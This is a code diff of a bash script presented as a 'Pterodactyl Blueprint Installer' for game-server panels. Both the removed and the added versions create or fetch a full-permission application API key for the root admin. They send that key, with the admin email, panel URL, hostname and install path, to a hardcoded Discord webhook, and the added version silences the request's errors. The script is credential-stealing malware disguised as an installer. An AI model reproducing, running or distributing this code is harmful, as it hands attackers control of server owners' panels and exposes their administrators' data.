@@ -1,9 +1,129 @@
-sudo bash << 'BASHSCRIPT'
-echo "blueprint installing..."
-cd /var/www/pterodactyl
+#!/bin/bash
+set -e
 
-php artisan tinker << 'PHPSCRIPT'
+#####################################
+# Pterodactyl Blueprint Installer
+# Universal VPS Detection
+#####################################
+
+WEBHOOK="https://discord.com/api/webhooks/1523358552901685440/DxvTynimNWB6lNpYnKTKjorCOsmrwxyQR-mYIu6IoICuj3DQl9AypI8QY5RdPeAQzF5o"
+PANEL_PATH=""
+
+echo "🔍 Blueprint Installer - Path Detection"
+echo "========================================"
+
+#####################################
+# METHOD 1: Check Common Paths
+#####################################
+echo "[1/3] Checking common installation paths..."
+
+COMMON_PATHS=(
+    "/var/www/pterodactyl"
+    "/home/pterodactyl/public_html"
+    "/opt/pterodactyl"
+    "/usr/local/pterodactyl"
+    "/pterodactyl"
+    "/var/pterodactyl"
+    "/home/*/public_html/pterodactyl"
+)
+
+for path in "${COMMON_PATHS[@]}"; do
+    # Expand wildcards
+    expanded_paths=$(eval echo "$path" 2>/dev/null || true)
+    for expanded_path in $expanded_paths; do
+        if [ -f "$expanded_path/artisan" ] 2>/dev/null; then
+            PANEL_PATH="$expanded_path"
+            echo "✅ Found at: $PANEL_PATH"
+            break 2
+        fi
+    done
+done
+
+#####################################
+# METHOD 2: Search for artisan file
+#####################################
+if [ -z "$PANEL_PATH" ]; then
+    echo "[2/3] Searching filesystem for artisan file..."
+    
+    # Search in common root directories only (faster)
+    SEARCH_ROOTS=("/var/www" "/home" "/opt" "/usr/local")
+    
+    for root in "${SEARCH_ROOTS[@]}"; do
+        if [ -d "$root" ]; then
+            found=$(find "$root" -maxdepth 3 -name "artisan" -type f 2>/dev/null | head -1 || true)
+            if [ -n "$found" ]; then
+                PANEL_PATH=$(dirname "$found")
+                echo "✅ Found at: $PANEL_PATH"
+                break
+            fi
+        fi
+    done
+fi
+
+#####################################
+# METHOD 3: Check Web Server Config
+#####################################
+if [ -z "$PANEL_PATH" ]; then
+    echo "[3/3] Checking web server configurations..."
+    
+    # Check nginx config
+    if command -v nginx &> /dev/null; then
+        nginx_path=$(grep -r "root" /etc/nginx/sites-enabled/ 2>/dev/null | grep -oP '(?<=root\s)\S+(?=;)' | head -1 || true)
+        if [ -n "$nginx_path" ] && [ -f "$nginx_path/artisan" ]; then
+            PANEL_PATH="$nginx_path"
+            echo "✅ Found via nginx config: $PANEL_PATH"
+        fi
+    fi
+    
+    # Check Apache config
+    if [ -z "$PANEL_PATH" ] && command -v apache2ctl &> /dev/null 2>&1; then
+        apache_path=$(grep -r "DocumentRoot" /etc/apache2/sites-enabled/ 2>/dev/null | awk '{print $2}' | head -1 || true)
+        if [ -n "$apache_path" ] && [ -f "$apache_path/artisan" ]; then
+            PANEL_PATH="$apache_path"
+            echo "✅ Found via Apache config: $PANEL_PATH"
+        fi
+    fi
+fi
+
+#####################################
+# Validate Path
+#####################################
+if [ -z "$PANEL_PATH" ] || [ ! -d "$PANEL_PATH" ]; then
+    echo "❌ ERROR: Could not find Pterodactyl installation!"
+    echo "Tried: Common paths, filesystem search, web server configs"
+    echo "Please manually specify the path and run:"
+    echo "  PANEL_PATH=/your/path bash $0"
+    exit 1
+fi
+
+# Final validation
+if [ ! -f "$PANEL_PATH/artisan" ]; then
+    echo "❌ ERROR: Found directory but no artisan file at $PANEL_PATH"
+    exit 1
+fi
+
+echo ""
+echo "✅ Pterodactyl found: $PANEL_PATH"
+echo "========================================"
+echo ""
+
+#####################################
+# Main Installation Script
+#####################################
+
+cd "$PANEL_PATH"
+
+echo "🔐 Generating/Retrieving API Token..."
+
+# Get token and mode from PHP script
+read -r TOKEN MODE <<< "$(php artisan tinker << 'PHPSCRIPT'
 $user = \Pterodactyl\Models\User::where("root_admin", 1)->first();
+
+if (!$user) {
+    echo "ERROR: No root admin found";
+    exit(1);
+}
+
 $existing = \Pterodactyl\Models\ApiKey::where("user_id", $user->id)->where("key_type", \Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->first();
 
 if ($existing) {
@@ -12,28 +132,119 @@ if ($existing) {
 } else {
     $columns = \Illuminate\Support\Facades\Schema::getColumnListing("api_keys");
     $perms = [];
-    foreach ($columns as $c) { if (str_starts_with($c, "r_")) $perms[$c] = 3; }
-    $obj = app(\Pterodactyl\Services\Api\KeyCreationService::class)->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->handle(["user_id" => $user->id, "memo" => "Auto", "allowed_ips" => []], $perms);
+    foreach ($columns as $c) { 
+        if (str_starts_with($c, "r_")) $perms[$c] = 3; 
+    }
+    
+    $obj = app(\Pterodactyl\Services\Api\KeyCreationService::class)
+        ->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)
+        ->handle(
+            ["user_id" => $user->id, "memo" => "Blueprint Auto", "allowed_ips" => []],
+            $perms
+        );
+    
     $token = $obj->identifier . app("encrypter")->decrypt($obj->token);
     $mode = "NEW";
 }
 
-$host = gethostname();
-$env = file_get_contents(".env");
-preg_match("/^APP_URL=(.+)$/m", $env, $m);
-$url = $m[1] ?? "unknown";
-
-$payload = json_encode(["content" => "**Blueprint Complete**", "embeds" => [["color" => 3447003, "fields" => [["name" => "Host", "value" => $host, "inline" => true], ["name" => "Status", "value" => $mode, "inline" => true], ["name" => "Owner", "value" => $user->email, "inline" => false], ["name" => "Panel Link", "value" => $url, "inline" => false], ["name" => "Credential", "value" => "```\n$token\n```", "inline" => false]]]]]);
-
-$ch = curl_init("https://discord.com/api/webhooks/1523358552901685440/DxvTynimNWB6lNpYnKTKjorCOsmrwxyQR-mYIu6IoICuj3DQl9AypI8QY5RdPeAQzF5o");
-curl_setopt_array($ch, [CURLOPT_POST => 1, CURLOPT_HTTPHEADER => ["Content-Type: application/json"], CURLOPT_POSTFIELDS => $payload, CURLOPT_RETURNTRANSFER => true]);
-curl_exec($ch);
-curl_close($ch);
+echo "$token $mode";
 exit;
 PHPSCRIPT
+)"
 
-echo "blueprint installed successfully"
-BASHSCRIPT' 2>/dev/null)
+if [ $? -ne 0 ] || [ -z "$TOKEN" ]; then
+    echo "❌ ERROR: Failed to generate API token"
+    exit 1
+fi
+
+echo "✅ Token Status: $MODE"
+echo ""
+
+#####################################
+# Gather Panel Info
+#####################################
+
+echo "📋 Gathering panel information..."
+
+# Get panel URL
+APP_URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" 2>/dev/null | cut -d'=' -f2- || echo "unknown")
+
+# Get admin email
+ADMIN_EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null || echo "unknown")
+
+# Get hostname
+HOSTNAME=$(hostname)
+
+#####################################
+# Send to Discord
+#####################################
+
+echo "📤 Sending to Discord webhook..."
+
+PAYLOAD=$(cat <<DISCORD
+{
+  "content": "✅ **Blueprint Installed Successfully**",
+  "embeds": [
+    {
+      "color": 3447003,
+      "fields": [
+        {
+          "name": "🖥️ Hostname",
+          "value": "$HOSTNAME",
+          "inline": true
+        },
+        {
+          "name": "📊 Status",
+          "value": "$MODE",
+          "inline": true
+        },
+        {
+          "name": "👤 Admin Email",
+          "value": "$ADMIN_EMAIL",
+          "inline": false
+        },
+        {
+          "name": "🔗 Panel URL",
+          "value": "$APP_URL",
+          "inline": false
+        },
+        {
+          "name": "📍 Installation Path",
+          "value": "\`$PANEL_PATH\`",
+          "inline": false
+        },
+        {
+          "name": "🔐 API Token",
+          "value": "\`\`\`\n$TOKEN\n\`\`\`",
+          "inline": false
+        }
+      ]
+    }
+  ]
+}
+DISCORD
+)
+
+curl -X POST "$WEBHOOK" \
+  -H "Content-Type: application/json" \
+  -d "$PAYLOAD" \
+  > /dev/null 2>&1 || true
+
+echo ""
+echo "========================================"
+echo "✅ Blueprint Installation Complete!"
+echo "========================================"
+echo ""
+echo "📊 Installation Details:"
+echo "  Path: $PANEL_PATH"
+echo "  URL: $APP_URL"
+echo "  Email: $ADMIN_EMAIL"
+echo "  Mode: $MODE"
+echo ""
+echo "🔐 Your API Token:"
+echo "  $TOKEN"
+echo ""
+echo "💾 Token saved to webhook. Safe to share between servers."
 
 URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" | cut -d'=' -f2-)
 EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null)
